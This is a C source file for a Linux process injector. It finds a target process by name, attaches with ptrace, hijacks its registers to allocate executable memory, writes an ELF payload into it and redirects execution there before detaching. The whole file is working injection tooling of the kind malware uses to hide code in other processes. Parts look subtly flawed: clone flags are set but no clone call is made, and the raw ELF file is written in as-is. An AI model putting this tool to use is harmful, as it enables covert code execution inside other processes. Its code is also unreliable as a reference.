#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/uio.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <errno.h>
#include <stdint.h>
#include <elf.h>
#include <stdarg.h>
#include <sys/mman.h>
#include <sched.h>
#define STACK_SIZE 0x4000
#define LOGFILE "/tmp/injector.log"

FILE *log_file;

void logmsg(const char *fmt, ...) {
    va_list args;
    va_start(args, fmt);
    vfprintf(log_file, fmt, args);
    fprintf(log_file, "\n");
    fflush(log_file);
    va_end(args);
}

void error_exit(const char *msg) {
    fprintf(log_file, "[-] %s: %s\n", msg, strerror(errno));
    fflush(log_file);
    exit(1);
}

uint64_t get_entry_point(const char *elf_path) {
    FILE *f = fopen(elf_path, "rb");
    if (!f) error_exit("fopen ELF for e_entry");
    Elf64_Ehdr eh;
    (void)fread(&eh, sizeof(eh), 1, f);
    fclose(f);
    return eh.e_entry;
}

uint64_t calculate_remote_entry(const char *elf_path, uint64_t remote_addr) {
    uint64_t local_entry = get_entry_point(elf_path);
    FILE *f = fopen(elf_path, "rb");
    if (!f) error_exit("fopen ELF for base offset");
    Elf64_Ehdr eh;
    (void)fread(&eh, sizeof(eh), 1, f);
    Elf64_Phdr phdr;
    fseek(f, eh.e_phoff, SEEK_SET);
    for (int i = 0; i < eh.e_phnum; i++) {
        (void)fread(&phdr, sizeof(phdr), 1, f);
        if (phdr.p_type == PT_LOAD && phdr.p_offset == 0) {
            fclose(f);
            uint64_t local_base = phdr.p_vaddr;
            return remote_addr + (local_entry - local_base);
        }
    }
    fclose(f);
    error_exit("No suitable PT_LOAD segment found");
    return 0;
}

char *read_payload(const char *path, size_t *size) {
    FILE *f = fopen(path, "rb");
    if (!f) error_exit("fopen payload");
    fseek(f, 0, SEEK_END);
    *size = ftell(f);
    fseek(f, 0, SEEK_SET);
    char *buf = malloc(*size);
    if (!buf) error_exit("malloc");
    (void)fread(buf, 1, *size, f);
    fclose(f);
    return buf;
}

pid_t find_pid_by_name(const char *name) {
    DIR *proc = opendir("/proc");
    if (!proc) error_exit("opendir /proc");
    struct dirent *ent;
    while ((ent = readdir(proc))) {
        if (ent->d_type != DT_DIR) continue;
        pid_t pid = atoi(ent->d_name);
        if (pid <= 0) continue;
        char path[256];
        snprintf(path, sizeof(path), "/proc/%d/comm", pid);
        FILE *f = fopen(path, "r");
        if (!f) continue;
        char proc_name[256];
        if (fgets(proc_name, sizeof(proc_name), f)) {
            proc_name[strcspn(proc_name, "\n")] = 0;
            if (strcmp(proc_name, name) == 0) {
                fclose(f);
                closedir(proc);
                return pid;
            }
        }
        fclose(f);
    }
    closedir(proc);
    error_exit("Target process not found");
    return -1;
}

int main(int argc, char *argv[]) {
    log_file = fopen(LOGFILE, "a");
    if (!log_file) error_exit("open log file");

    if (argc != 3) {
        logmsg("Usage: %s <process_name> <elf_file>", argv[0]);
        return 1;
    }

    const char *target_name = argv[1];
    const char *elf_path = argv[2];
    size_t payload_size;
    char *payload = read_payload(elf_path, &payload_size);

    pid_t pid = find_pid_by_name(target_name);
    logmsg("[+] Target PID: %d", pid);

    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) error_exit("ptrace attach");
    waitpid(pid, NULL, 0);

    struct user_regs_struct regs, backup;
    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) == -1) error_exit("ptrace getregs");
    memcpy(&backup, &regs, sizeof(regs));

    regs.rax = 9; // syscall number for mmap
    regs.rdi = 0;
    regs.rsi = payload_size + STACK_SIZE;
    regs.rdx = PROT_READ | PROT_WRITE | PROT_EXEC;
    regs.r10 = MAP_PRIVATE | MAP_ANONYMOUS;
    regs.r8 = -1;
    regs.r9 = 0;

    regs.rip -= 2; // rewind to avoid crash
    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) == -1) error_exit("setregs before syscall");

    if (ptrace(PTRACE_SYSCALL, pid, NULL, NULL) == -1) error_exit("ptrace syscall entry");
    waitpid(pid, NULL, 0);

    if (ptrace(PTRACE_SYSCALL, pid, NULL, NULL) == -1) error_exit("ptrace syscall exit");
    waitpid(pid, NULL, 0);

    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) == -1) error_exit("getregs after syscall");
    unsigned long remote_addr = regs.rax;
    if (remote_addr < 0x1000) error_exit("mmap failed");
    logmsg("[+] mmap returned remote addr: 0x%lx", remote_addr);

    struct iovec local_iov = { .iov_base = payload, .iov_len = payload_size };
    struct iovec remote_iov = { .iov_base = (void *)remote_addr, .iov_len = payload_size };
    ssize_t written = process_vm_writev(pid, &local_iov, 1, &remote_iov, 1, 0);
    if (written != payload_size) error_exit("process_vm_writev");
    logmsg("[+] Wrote payload (%zd bytes)", written);

    uint64_t remote_entry = calculate_remote_entry(elf_path, remote_addr);
    logmsg("[+] Remote entry calculated at: 0x%lx", remote_entry);

    regs.rdi = CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SIGHAND | CLONE_THREAD;
    regs.rsi = remote_addr + payload_size;
    regs.rip = remote_entry;
    regs.rsp = remote_addr + payload_size - 8;

    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) == -1) error_exit("setregs before clone");
    if (ptrace(PTRACE_CONT, pid, NULL, NULL) == -1) error_exit("continue after clone");
    waitpid(pid, NULL, 0);

    if (ptrace(PTRACE_SETREGS, pid, NULL, &backup) == -1) error_exit("restore regs");
    if (ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1) error_exit("detach");

    logmsg("[+] Injection complete");
    fclose(log_file);
    return 0;
}
